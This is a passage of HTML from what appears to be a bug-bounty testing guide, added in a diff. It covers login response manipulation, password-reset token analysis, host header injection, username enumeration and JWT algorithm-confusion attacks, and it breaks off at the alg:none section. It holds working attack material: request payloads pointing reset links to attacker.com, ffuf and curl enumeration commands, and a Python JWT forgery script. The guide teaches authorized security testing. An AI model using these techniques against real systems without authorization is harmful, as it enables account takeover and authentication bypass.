+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="w">  </span>https-form-post://target.com/login<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="w">  </span><span class="s2">&quot;username=^USER^&amp;password=^PASS^:Invalid credentials&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="w">  </span>-t<span class="w"> </span><span class="m">4</span><span class="w"> </span>-w<span class="w"> </span><span class="m">3</span>
+</span></code></pre></div>
+<div class="admonition danger">
+<p class="admonition-title">If you get in</p>
+<p>Screenshot the panel. Do not make changes. Report immediately. Accessing an admin panel via default credentials is Critical on most programs.</p>
+</div>
+<hr />
+<h3 id="213-response-manipulation">2.1.3 Response Manipulation<a class="headerlink" href="#213-response-manipulation" title="Permanent link">&para;</a></h3>
+<p><strong>When to use:</strong> On any app that makes auth decisions based on a server response value, especially SPAs (React, Angular, Vue) where the frontend drives navigation.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>Normal flow:
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>→ POST /login {username, password}
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>← 200 {&quot;success&quot;: false, &quot;redirect&quot;: null}
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>→ Browser stays on login page
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>Manipulated:
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>→ POST /login {username, password}
+</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>← intercept response → change &quot;false&quot; to &quot;true&quot;
+</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>← 200 {&quot;success&quot;: true, &quot;redirect&quot;: &quot;/dashboard&quot;}
+</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>→ Does the browser now grant access?
+</span></code></pre></div>
+<div class="language-bash highlight"><span class="filename">burp_match_replace</span><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c1"># Proxy → Options → Match and Replace</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="c1"># Add rule: Response body</span>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="c1"># Match:   success\&quot;:false</span>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="c1"># Replace: success\&quot;:true</span>
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="c1"># Or intercept manually:</span>
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="c1"># Proxy → Intercept → &quot;Intercept responses to this request&quot;</span>
+</span></code></pre></div>
+<p><strong>Other response values to manipulate:</strong></p>
+<div class="language-json highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="p">{</span><span class="nt">&quot;authenticated&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">}</span><span class="w">  </span><span class="err">→</span><span class="w">  </span><span class="p">{</span><span class="nt">&quot;authenticated&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">}</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="p">{</span><span class="nt">&quot;role&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;user&quot;</span><span class="p">}</span><span class="w">          </span><span class="err">→</span><span class="w">  </span><span class="p">{</span><span class="nt">&quot;role&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;admin&quot;</span><span class="p">}</span>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="p">{</span><span class="nt">&quot;mfa_required&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">}</span><span class="w">    </span><span class="err">→</span><span class="w">  </span><span class="p">{</span><span class="nt">&quot;mfa_required&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">}</span>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="p">{</span><span class="nt">&quot;account_locked&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">}</span><span class="w">  </span><span class="err">→</span><span class="w">  </span><span class="p">{</span><span class="nt">&quot;account_locked&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">}</span>
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="p">{</span><span class="nt">&quot;verified&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">}</span><span class="w">       </span><span class="err">→</span><span class="w">  </span><span class="p">{</span><span class="nt">&quot;verified&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">}</span>
+</span></code></pre></div>
+<div class="admonition info">
+<p class="admonition-title">Persistence caveat</p>
+<p>If the server re-validates on subsequent requests, response manipulation won't give persistent access — but it still demonstrates the flaw and is worth reporting. Impact depends on what the manipulated response unlocks.</p>
+</div>
+<hr />
+<h2 id="22-password-reset-flaws">2.2 Password Reset Flaws<a class="headerlink" href="#22-password-reset-flaws" title="Permanent link">&para;</a></h2>
+<p>Password reset is one of the most consistently vulnerable features in web apps. It involves generating a secret, transmitting it, and validating it on use. Each step can fail.</p>
+<h3 id="221-token-predictability">2.2.1 Token Predictability<a class="headerlink" href="#221-token-predictability" title="Permanent link">&para;</a></h3>
+<p><strong>When to use:</strong> On every password reset implementation. Request multiple tokens and analyze for patterns before testing anything else.</p>
+<div class="language-bash highlight"><span class="filename">token_analysis.sh</span><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="c1"># Request 5-10 reset tokens for your own test account</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="c1"># Collect tokens from emails, then analyze:</span>
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="c1"># Sequential?</span>
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="c1"># Token 1: reset_1001</span>
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="c1"># Token 2: reset_1002 → trivially predictable</span>
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a><span class="c1"># Time-based?</span>
+</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a><span class="c1"># Token: 1714000000abc → decode the timestamp portion</span>
+</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;1714000000&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>date<span class="w"> </span>-d<span class="w"> </span>@1714000000
+</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a>
+</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a><span class="c1"># MD5/SHA1 of predictable input?</span>
+</span><span id="__span-8-13"><a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a><span class="nb">echo</span><span class="w"> </span>-n<span class="w"> </span><span class="s2">&quot;admin@target.com&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>md5sum
+</span><span id="__span-8-14"><a id="__codelineno-8-14" name="__codelineno-8-14" href="#__codelineno-8-14"></a><span class="nb">echo</span><span class="w"> </span>-n<span class="w"> </span><span class="s2">&quot;admin@target.com</span><span class="k">$(</span>date<span class="w"> </span>+%Y%m%d<span class="k">)</span><span class="s2">&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>md5sum
+</span></code></pre></div>
+<p><strong>Token quality reference:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Example</th>
+<th>Verdict</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Sequential</td>
+<td><code>reset_1001</code>, <code>reset_1002</code></td>
+<td>Broken</td>
+</tr>
+<tr>
+<td>Date + email</td>
+<td><code>20260429-admin@target.com</code></td>
+<td>Broken</td>
+</tr>
+<tr>
+<td>MD5 of email</td>
+<td><code>5f4dcc3b5aa765d61d8327deb882cf99</code></td>
+<td>Broken</td>
+</tr>
+<tr>
+<td>6-digit OTP, no rate limit</td>
+<td><code>482910</code></td>
+<td>Brute-forceable</td>
+</tr>
+<tr>
+<td>64-char random alphanumeric</td>
+<td><code>a9f2c...</code></td>
+<td>Secure</td>
+</tr>
+<tr>
+<td>Signed JWT, short expiry</td>
+<td><code>eyJ...</code></td>
+<td>Secure (if impl is correct)</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h3 id="222-host-header-injection">2.2.2 Host Header Injection<a class="headerlink" href="#222-host-header-injection" title="Permanent link">&para;</a></h3>
+<p><strong>When to use:</strong> On every forgot-password flow. One of the highest-yield tests relative to effort — takes 5 minutes and regularly produces High/Critical findings.</p>
+<p>Many apps generate the reset link by reading the <code>Host</code> header from the request without validating it. The victim receives a reset email pointing to the attacker's server.</p>
+<div class="language-http highlight"><span class="filename">basic_host_swap</span><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="nf">POST</span> <span class="nn">/forgot-password</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="na">Host</span><span class="o">:</span> <span class="l">attacker.com</span>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>email=victim@target.com
+</span></code></pre></div>
+<p><strong>All variations to test:</strong></p>
+<div class="language-http highlight"><span class="filename">host_injection_variants</span><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="err"># X-Forwarded-Host (bypasses Host validation more often than direct swap)</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="err">Host: target.com</span>
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="err">X-Forwarded-Host: attacker.com</span>
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="err"># X-Host</span>
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="err">X-Host: attacker.com</span>
+</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>
+</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a><span class="err"># Forwarded header</span>
+</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a><span class="err">Forwarded: host=attacker.com</span>
+</span><span id="__span-10-10"><a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a>
+</span><span id="__span-10-11"><a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a><span class="err"># Port confusion</span>
+</span><span id="__span-10-12"><a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a><span class="err">Host: target.com:@attacker.com</span>
+</span><span id="__span-10-13"><a id="__codelineno-10-13" name="__codelineno-10-13" href="#__codelineno-10-13"></a>
+</span><span id="__span-10-14"><a id="__codelineno-10-14" name="__codelineno-10-14" href="#__codelineno-10-14"></a><span class="err"># Subdomain confusion</span>
+</span><span id="__span-10-15"><a id="__codelineno-10-15" name="__codelineno-10-15" href="#__codelineno-10-15"></a><span class="err">Host: attacker.com.target.com</span>
+</span></code></pre></div>
+<div class="language-bash highlight"><span class="filename">burp_workflow</span><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="c1"># 1. Forgot password page → intercept POST</span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="c1"># 2. Replace Host with Burp Collaborator URL</span>
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="c1"># 3. Forward request</span>
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="c1"># 4. Check Collaborator for incoming HTTP request containing the reset token</span>
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>
+</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a><span class="c1"># Free alternative to Collaborator:</span>
+</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>interactsh-client<span class="w"> </span>-server<span class="w"> </span>interactsh.com
+</span></code></pre></div>
+<p><strong>What to include in report:</strong>
+- Collaborator interaction showing the token arriving at your server
+- Screenshot of the victim's email showing your domain in the reset link</p>
+<hr />
+<h3 id="223-token-reuse-and-expiry">2.2.3 Token Reuse and Expiry<a class="headerlink" href="#223-token-reuse-and-expiry" title="Permanent link">&para;</a></h3>
+<p><strong>When to use:</strong> After confirming a token exists and works. Run all five tests.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>1. Token reuse after use
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>   → Use the token, then try using the same token again
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>   → Expected: invalidated. Works again → report it.
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>
+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>2. Token doesn&#39;t expire
+</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>   → Request token, wait 24 hours, use it
+</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>   → Expected: expired. Still works → report it.
+</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>
+</span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a>3. Old token not invalidated when new one is requested
+</span><span id="__span-12-10"><a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a>   → Request Token A, then request Token B
+</span><span id="__span-12-11"><a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a>   → Try Token A → should fail. Works → report it.
+</span><span id="__span-12-12"><a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a>
+</span><span id="__span-12-13"><a id="__codelineno-12-13" name="__codelineno-12-13" href="#__codelineno-12-13"></a>4. Token not bound to account
+</span><span id="__span-12-14"><a id="__codelineno-12-14" name="__codelineno-12-14" href="#__codelineno-12-14"></a>   → Request reset for Account A (get token)
+</span><span id="__span-12-15"><a id="__codelineno-12-15" name="__codelineno-12-15" href="#__codelineno-12-15"></a>   → Submit token with Account B&#39;s email in the form
+</span><span id="__span-12-16"><a id="__codelineno-12-16" name="__codelineno-12-16" href="#__codelineno-12-16"></a>   → Expected: validation fails. Allows password change → ATO.
+</span><span id="__span-12-17"><a id="__codelineno-12-17" name="__codelineno-12-17" href="#__codelineno-12-17"></a>
+</span><span id="__span-12-18"><a id="__codelineno-12-18" name="__codelineno-12-18" href="#__codelineno-12-18"></a>5. Token leaks via Referer
+</span><span id="__span-12-19"><a id="__codelineno-12-19" name="__codelineno-12-19" href="#__codelineno-12-19"></a>   → After clicking reset link, navigate to an external link
+</span><span id="__span-12-20"><a id="__codelineno-12-20" name="__codelineno-12-20" href="#__codelineno-12-20"></a>   → Check if Referer header contains the token (requires token in URL query param)
+</span></code></pre></div>
+<hr />
+<h3 id="224-username-enumeration">2.2.4 Username Enumeration<a class="headerlink" href="#224-username-enumeration" title="Permanent link">&para;</a></h3>
+<p><strong>When to use:</strong> On every forgot-password, login, and registration endpoint. They often behave differently from each other.</p>
+<div class="language-bash highlight"><span class="filename">enumeration_test.sh</span><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="c1"># Compare responses for registered vs unregistered email</span>
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="c1"># Look for: different message, different response size, different timing</span>
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="c1"># ffuf automated check</span>
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>ffuf<span class="w"> </span>-u<span class="w"> </span>https://target.com/forgot-password<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a><span class="w">  </span>-X<span class="w"> </span>POST<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a><span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;email=FUZZ@target.com&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a><span class="w">  </span>-w<span class="w"> </span>/opt/SecLists/Usernames/top-usernames-shortlist.txt<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-13-9"><a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a><span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Content-Type: application/x-www-form-urlencoded&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-13-10"><a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a><span class="w">  </span>-mr<span class="w"> </span><span class="s2">&quot;sent&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-13-11"><a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a><span class="w">  </span>-o<span class="w"> </span>enum_results.txt
+</span><span id="__span-13-12"><a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a>
+</span><span id="__span-13-13"><a id="__codelineno-13-13" name="__codelineno-13-13" href="#__codelineno-13-13"></a><span class="c1"># Timing oracle</span>
+</span><span id="__span-13-14"><a id="__codelineno-13-14" name="__codelineno-13-14" href="#__codelineno-13-14"></a><span class="k">for</span><span class="w"> </span>email<span class="w"> </span><span class="k">in</span><span class="w"> </span>admin@target.com<span class="w"> </span>fake12345@notreal.com<span class="p">;</span><span class="w"> </span><span class="k">do</span>
+</span><span id="__span-13-15"><a id="__codelineno-13-15" name="__codelineno-13-15" href="#__codelineno-13-15"></a><span class="w">  </span><span class="nb">time</span><span class="w"> </span>curl<span class="w"> </span>-s<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>https://target.com/forgot-password<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-13-16"><a id="__codelineno-13-16" name="__codelineno-13-16" href="#__codelineno-13-16"></a><span class="w">    </span>-d<span class="w"> </span><span class="s2">&quot;email=</span><span class="nv">$email</span><span class="s2">&quot;</span><span class="w"> </span>&gt;<span class="w"> </span>/dev/null
+</span><span id="__span-13-17"><a id="__codelineno-13-17" name="__codelineno-13-17" href="#__codelineno-13-17"></a><span class="k">done</span>
+</span><span id="__span-13-18"><a id="__codelineno-13-18" name="__codelineno-13-18" href="#__codelineno-13-18"></a><span class="c1"># Significant difference = timing oracle</span>
+</span></code></pre></div>
+<div class="admonition info">
+<p class="admonition-title">Severity context</p>
+<p>Username enumeration alone is P4/Informational on most programs. The exception: healthcare, finance, or any app where confirming a user exists has real-world sensitivity (e.g. a mental health platform). Always check login, registration, and forgot-password separately — they often behave differently.</p>
+</div>
+<hr />
+<h2 id="23-jwt-attacks">2.3 JWT Attacks<a class="headerlink" href="#23-jwt-attacks" title="Permanent link">&para;</a></h2>
+<p>JSON Web Tokens are used as session tokens, API auth tokens, and inter-service credentials. A broken JWT implementation can mean full authentication bypass or privilege escalation without a password. JWT bugs are common because the spec has dangerous optional features that developers implement incorrectly.</p>
+<div class="language-bash highlight"><span class="filename">decode_jwt.sh</span><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="c1"># Decode header</span>
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="c1"># {&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;}</span>
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>
+</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="c1"># Decode payload</span>
+</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;eyJ1c2VyX2lkIjoxMjMsInJvbGUiOiJ1c2VyIn0&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d
+</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a><span class="c1"># {&quot;user_id&quot;:123,&quot;role&quot;:&quot;user&quot;}</span>
+</span></code></pre></div>
+<h3 id="231-algorithm-confusion-rs256-hs256">2.3.1 Algorithm Confusion (RS256 → HS256)<a class="headerlink" href="#231-algorithm-confusion-rs256-hs256" title="Permanent link">&para;</a></h3>
+<p><strong>The attack:</strong> When a server uses RS256 (asymmetric — signs with private key, verifies with public key), switch the algorithm to HS256. If the server then uses its public key as the HMAC secret, you can forge tokens signed with the public key — which is, by definition, public.</p>
+<div class="language-python highlight"><span class="filename">algorithm_confusion.py</span><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">jwt</span>
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="c1"># 1. Get public key from /.well-known/jwks.json or /api/keys</span>
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="n">public_key</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;-----BEGIN PUBLIC KEY-----</span>
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a><span class="s2">MIIBIjANBgkJh...</span>
+</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a><span class="s2">-----END PUBLIC KEY-----&quot;&quot;&quot;</span>
+</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>
+</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a><span class="c1"># 2. Forge token with HS256, signed with the public key as secret</span>
+</span><span id="__span-15-9"><a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a><span class="n">forged_payload</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;user_id&quot;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="s2">&quot;role&quot;</span><span class="p">:</span> <span class="s2">&quot;admin&quot;</span><span class="p">}</span>
+</span><span id="__span-15-10"><a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a><span class="n">forged_token</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">forged_payload</span><span class="p">,</span> <span class="n">public_key</span><span class="p">,</span> <span class="n">algorithm</span><span class="o">=</span><span class="s2">&quot;HS256&quot;</span><span class="p">)</span>
+</span><span id="__span-15-11"><a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a><span class="nb">print</span><span class="p">(</span><span class="n">forged_token</span><span class="p">)</span>
+</span></code></pre></div>
+<div class="language-bash highlight"><span class="filename">jwt_tool_alg_confusion.sh</span><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="c1"># Automated — detect and test confusion</span>
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>python3<span class="w"> </span>jwt_tool.py<span class="w"> </span>&lt;token&gt;<span class="w"> </span>-X<span class="w"> </span>a<span class="w"> </span>-pk<span class="w"> </span>public_key.pem
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>
+</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="c1"># Full attack scan</span>
+</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>python3<span class="w"> </span>jwt_tool.py<span class="w"> </span>&lt;token&gt;<span class="w"> </span>-M<span class="w"> </span>at<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a><span class="w">  </span>-pk<span class="w"> </span>public_key.pem<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a><span class="w">  </span>-t<span class="w"> </span><span class="s2">&quot;https://target.com/api/protected&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-16-8"><a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a><span class="w">  </span>-rh<span class="w"> </span><span class="s2">&quot;Authorization: Bearer JWT_HERE&quot;</span>
+</span></code></pre></div>
+<hr />
+<h3 id="232-alg-none-bypass">2.3.2 <code>alg: none</code> Bypass<a class="headerlink" href="#232-alg-none-bypass" title="Permanent link">&para;</a></h3>
+<p><strong>The attack:</strong> The JWT spec allows <code>"alg": "none"</code> — no signature required. A vulnerable server accepts any unsigned token.</p>
+<div class="language-bash highlight"><span class="filename">alg_none.sh</span><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="c1"># Encode modified header with alg:none</span>
